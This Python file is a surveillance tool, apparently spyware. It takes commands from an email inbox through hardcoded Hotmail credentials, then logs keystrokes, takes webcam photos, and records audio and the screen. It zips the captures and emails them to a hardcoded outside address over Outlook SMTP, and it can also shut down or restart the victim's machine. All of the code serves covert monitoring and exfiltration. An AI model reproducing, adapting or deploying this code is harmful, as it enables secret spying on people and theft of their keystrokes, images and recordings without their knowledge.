import datetime
import glob
import os
import smtplib
import threading
import time
import urllib.request
import zipfile
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import cam
import key
import mailread
import screen
import sound


def connect(host='http://google.com'):
    try:
        urllib.request.urlopen(host)  # Python 3.x
        return True
    except:
        return False


b = False
if connect():
    wait = 1800
    turn = 1
    mtxt = 0
    mcam = 0
    mvrec = 0
    msrec = 0
    mvrecsec = 10
    msrecsec = 10
    mshutdown = 0
    # ----------------------------
    i = 0
    if os.path.exists("sends"):
        os.remove("sends")
        print("silindi")
    os.mkdir("sends")
    names = "sends/host"
    ncam = names + ".jpg"
    nvrec = names + ".wav"
    nsrec = names + ".avi"
    ntxt = names + ".txt"
    user = "gotyouhahahaha@hotmail.com"
    passw = "Ga1youhahaha."
    to = "getfromgot@hotmail.com"
    # ----------------------------
    frm, subject, body = mailread.mread(user, passw, os.getlogin())
    print(body + " - " + subject + " - " + frm)

    a = time.localtime()
    mkey = datetime.date(1900, a.tm_mon, 1).strftime('%B').lower()[2]
    subcont = os.getlogin() + "," + mkey + ",wait,turn,txt,cam,vrec,srec,vrecsec,srecsec,shutdown"
    if subject == subcont:
        sbody = str(body).split(",")
        print(sbody)
        try:
            wait, turn, mtxt, mcam, mvrec, msrec, mvrecsec, msrecsec, mshutdown = \
                int(sbody[0]), int(sbody[1]), int(sbody[2]), int(sbody[3]), int(sbody[4]), int(sbody[5]), int(
                    sbody[6]), int(sbody[7]), int(sbody[8])
        except:
            None
        b = True
        if mtxt > 0:
            t3 = threading.Thread(target=key.runkey, args=(ntxt, mtxt))  # key
            t3.start()

while b:
    i += 1
    print(str(i) + ". iterasyon başı")
    # time
    sysdate = str(a.tm_mday) + "." + str(a.tm_mon) + "." + str(a.tm_year) + "  " + str(a.tm_hour) + ":" + str(
        a.tm_min) + ":" + str(a.tm_sec)

    if mcam == 1 and i == 1:
        t1 = threading.Thread(target=cam.cams, args=(ncam,))
        t1.start()
    elif mcam == 2 and i % 2 == 0:
        t1 = threading.Thread(target=cam.cams, args=(ncam,))
        t1.start()
    elif mcam == 3:
        t1 = threading.Thread(target=cam.cams, args=(ncam,))
        t1.start()
    # ----------------------------
    if mvrec == 1 and i == 1:
        t2 = threading.Thread(target=sound.record, args=(nvrec, mvrecsec))
        t2.start()
    elif mvrec == 2 and i % 2 == 0:
        t2 = threading.Thread(target=sound.record, args=(nvrec, mvrecsec))
        t2.start()
    elif mvrec == 3:
        t2 = threading.Thread(target=sound.record, args=(nvrec, mvrecsec))
        t2.start()
    # ----------------------------
    if msrec == 1 and i == 1:
        t4 = threading.Thread(target=screen.screen_rec, args=(nsrec, msrecsec))
        t4.start()
    elif msrec == 2 and i % 2 == 0:
        t4 = threading.Thread(target=screen.screen_rec, args=(nsrec, msrecsec))
        t4.start()
    elif msrec == 3:
        t4 = threading.Thread(target=screen.screen_rec, args=(nsrec, msrecsec))
        t4.start()

    if t1.is_alive():
        t1.join()
    if t2.is_alive():
        t2.join()
    if t4.is_alive():
        t4.join()
        # ----------------------------

    # rar oluşturma
    arsivlenecekDosyalar = []
    for belge in glob.iglob("sends/*", recursive=False):
        arsivlenecekDosyalar.append(belge)
    with zipfile.ZipFile("bla/sends.zip", "w", compression=14) as arsiv:
        for dosya in arsivlenecekDosyalar:
            arsiv.write(dosya)
    # login
    # try:
    mail = smtplib.SMTP('smtp-mail.outlook.com', 587)
    mail.ehlo()
    mail.starttls()
    mail.login(user, passw)
    # except:
    #    None
    mesaj = MIMEMultipart()
    mesaj["From"] = user
    mesaj["To"] = to
    mesaj["Subject"] = os.getlogin() + " Logged In"

    # ----------------------------
    if os.path.exists("bla/sends.zip"):
        # zip
        part = MIMEBase('application', "octet-stream")
        part.set_payload(open("bla/sends.zip", "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename=' + "sends.zip")
        mesaj.attach(part)

    # tarih
    mesaj.attach(MIMEText('<p;">' + sysdate + '</p> ', "html"))
    # try:
    mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
    # except:
    # print("mailsend hata")
    mail.close()
    print(str(i) + ". iterasyon sonu")
    if i == 1:
        key.__setattr__('c', 0)
        b = False
    else:
        time.sleep(wait)

# ----------------------------
try:
    if t3.isAlive():
        t3.join()
    os.remove("sends")
    os.remove("bla/sends.zip")
    if mshutdown == 1:
        os.system("shutdown /s /t 1")
    elif mshutdown == 2:
        os.system("shutdown /r /t 1")
    elif 0 == 3:
        os.system("shutdown -l")
except:
    None
